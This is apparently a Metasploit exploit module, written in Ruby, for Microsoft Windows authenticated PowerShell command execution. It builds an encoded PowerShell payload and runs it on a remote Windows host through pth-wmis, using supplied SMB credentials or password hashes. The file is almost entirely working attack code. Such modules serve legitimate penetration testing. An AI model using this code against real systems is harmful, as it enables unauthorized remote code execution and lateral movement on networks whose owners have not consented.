# -*- coding: binary -*-

##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/exploit/powershell'


class Metasploit3 < Msf::Exploit::Remote
  Rank = ManualRanking

  include Exploit::Remote::SMB::Authenticated
  include Msf::Exploit::Powershell

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Microsoft Windows Authenticated Powershell Command Execution',
      'Description'    => %q{
      },

      'Author'         => [
        'Ben Campbell <eat_meatballs[at]hotmail.co.uk>'
      ],

      'License'        => MSF_LICENSE,
      'Privileged'     => true,
      'DefaultOptions' =>
        {
          'WfsDelay'     => 20,
          'EXITFUNC' => 'thread'
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'Windows x86', { 'Arch' => ARCH_X86 } ],
          [ 'Windows x64', { 'Arch' => ARCH_X86_64 } ]
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Jan 01 1999',
      'References'     => [
        [ 'CVE', '1999-0504'], # Administrator with no password (since this is the default)
        [ 'OSVDB', '3106'],
        [ 'URL', 'http://www.accuvant.com/blog/2012/11/13/owning-computers-without-shell-access' ],
        [ 'URL', 'http://sourceforge.net/projects/smbexec/' ],
        [ 'URL', 'http://technet.microsoft.com/en-us/sysinternals/bb897553.aspx' ]
      ]
    ))
  end

  def exploit
    command = cmd_psh_payload(payload.encoded,
                              payload_instance.arch.first,
                              {:remove_comspec => true})

    if datastore['PERSIST'] and not datastore['DisablePayloadHandler']
      print_warning("You probably want to DisablePayloadHandler and use exploit/multi/handler with the PERSIST option.")
    end

    if datastore['RUN_WOW64'] and target_arch.first == "x86_64"
      fail_with(Exploit::Failure::BadConfig, "Select an x86 target and payload with RUN_WOW64 enabled")
    end

    user = datastore['SMBUser']
    pass = datastore['SMBPass']
    domain = "#{datastore['SMBDomain']}/" if datastore['SMBDomain']

    command.gsub!("$","\\\\$")

    local_command = "pth-wmis -U #{domain}#{user}%#{pass} //#{datastore['RHOST']} \"#{command}\""

    system(local_command)
  end

  def peer
    return "#{datastore['RHOST']}:#{datastore['RPORT']}"
  end
end

